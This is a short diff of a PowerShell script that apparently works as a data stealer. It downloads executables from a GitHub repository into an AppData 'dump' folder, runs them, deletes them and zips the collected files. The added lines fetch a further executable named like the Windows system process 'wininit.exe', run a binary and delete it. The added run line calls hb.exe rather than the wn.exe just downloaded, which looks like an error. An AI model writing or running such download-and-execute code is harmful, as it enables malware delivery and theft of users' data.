@@ -11,6 +11,10 @@ Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/browser.e
 ./hb.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
+Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/wininit.exe" -OutFile "$env:appdata\dump\wn.exe"
+./hb.exe
+Start-Sleep -Seconds 6
+Remove-Item -Path "$env:appdata\dump\wn.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
